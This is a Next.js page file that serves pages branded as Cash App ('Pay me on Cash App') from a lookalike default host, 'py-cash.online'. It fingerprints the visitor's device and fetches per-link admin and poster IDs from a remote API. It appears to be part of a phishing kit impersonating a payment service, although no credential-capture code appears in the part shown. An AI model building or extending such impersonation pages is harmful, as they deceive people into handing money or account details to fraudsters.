import Home from "@/app/components/Home";
import { site, API_URL } from "@/app/config/index";
import { headers } from "next/headers";

export async function generateMetadata({ params }) {
  const { param, param2 } = params;
  const headersList = headers();
  const host = headersList.get("host") || "py-cash.online";

  return {
    metadataBase: new URL(`https://${host}`),
    title: param2 || "Cash App",
    description: `Pay me on Cash App — Instantly exchange money for free on Cash App`,
    openGraph: {
      title: param2 || "Cash App",
      description: `Pay me on Cash App — Instantly exchange money for free on Cash App`,
      type: "website",
      url: `/${param}/${param2}`,
      images: [
        {
          url: `/${param}/${param2}/opengraph-image`,
          width: 1200,
          height: 630,
          alt: "Pay on Cash App",
        },
      ],
    },
    twitter: {
      card: "summary_large_image",
      title: param2 || "Cash App",
      description: `Pay me on Cash App — Instantly exchange money for free on Cash App`,
      images: [`/${param}/${param2}/opengraph-image`],
    },
  };
}

export default async function page({ params }) {
  const { param, param2 } = params;
  // console.log("Two Params Route:", param, param2);

  const headersList = headers();
  const userAgent = headersList.get("user-agent") || "";

  const isMobileView = userAgent.match(
    /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
  );

  const isTabletView = userAgent.match(
    /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
  );

  const host = (headersList.get("host") || site || "").replace(/^www\./, "");
  const device = isMobileView ? "phone" : isTabletView ? "ipad" : "desktop";

  // Dynamic URL with site name, param, param2, and device
  const url = `${API_URL}/${host || site}/${param}/${param2}/${device}`;

//   console.log("API_URL",API_URL)
// console.log("site",site)
// console.log("device",device)
// console.log("param",param)
// console.log("param2",param2)
// console.log("url",url)


  try {
    const res = await fetch(url);
    const data = await res.json();
    console.log("Two Params Page data:", data);
// console.log(url)
//   console.log(API_URL)

    if (data?.success === "exists") {
      return <Home adminId={data.adminId} posterId={data.posterId} param={param} param2={param2} linkConfig={data.link} />;
    }
  } catch (error) {
    console.error("Error fetching dynamic page data:", error);
  }

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-50">
      <div className="text-xl font-bold text-gray-400">No Page found!!</div>
    </div>
  );
}
